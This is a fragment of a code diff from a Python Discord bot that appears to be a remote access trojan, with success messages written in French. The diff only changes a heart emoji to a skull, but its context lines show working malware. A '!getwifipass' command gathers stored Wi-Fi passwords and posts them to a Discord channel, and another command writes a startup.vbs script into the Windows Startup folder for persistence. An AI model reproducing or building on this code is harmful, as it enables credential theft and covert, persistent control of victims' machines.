         if message.content == "!getwifipass":
@@ -1728,7 +1665,7 @@ async def on_message(message):
                                 break
                         almoast = '"' + e + '"' + ":" + '"' + ok + '"'
                         done.append(almoast)
-                    await message.channel.send("[❤️] - La commande à été éxecutée avec succès")  
+                    await message.channel.send("[💀] - La commande à été éxecutée avec succès")  
                     await message.channel.send(done)
             else:
                 await message.channel.send("[❌] - Cette commande requiert les droit administrateur")
@@ -1753,7 +1690,7 @@ async def on_message(message):
                     with open(r"C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startup.vbs".format(os.getenv("USERNAME")), "w") as f:
                         f.write(e)
                         f.close()
-                await message.channel.send("[❤️] - La commande à été éxecutée avec succès")  
+                await message.channel.send("[💀] - La commande à été éxecutée avec succès")  
             else:
                 await message.channel.send("[❌] - Cette commande requiert les droit administrateur")
 
